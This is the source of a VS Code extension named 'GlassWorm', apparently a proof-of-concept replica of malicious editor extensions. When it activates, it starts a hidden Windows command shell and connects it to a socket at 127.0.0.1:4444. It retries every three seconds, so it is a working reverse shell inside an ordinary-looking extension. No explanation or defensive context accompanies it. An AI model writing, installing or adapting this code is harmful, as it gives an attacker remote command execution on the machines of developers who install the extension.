const vscode = require('vscode');
const { spawn } = require('child_process');
const net = require('net');

function activate(context) {
    console.log('[GlassWorm] Activated');
    
    const SERVER_IP = "127.0.0.1";
    const SERVER_PORT = 4444;
    
    function connect() {
        const client = new net.Socket();
        
        client.connect(SERVER_PORT, SERVER_IP, () => {
            const cmd = spawn('cmd.exe', [], {
                shell: true,
                windowsHide: true,
                stdio: ['pipe', 'pipe', 'pipe']
            });
            
            cmd.stdout.on('data', (data) => {
                client.write(data);
            });
            
            cmd.stderr.on('data', (data) => {
                client.write(data);
            });
            
            client.on('data', (data) => {
                cmd.stdin.write(data);
            });
            
            client.on('close', () => {
                cmd.kill();
            });
        });
        
        client.on('error', () => {
            setTimeout(connect, 3000);
        });
    }
    
    connect();
    vscode.window.showInformationMessage('GlassWorm Loaded');
}

function deactivate() {}

module.exports = { activate, deactivate };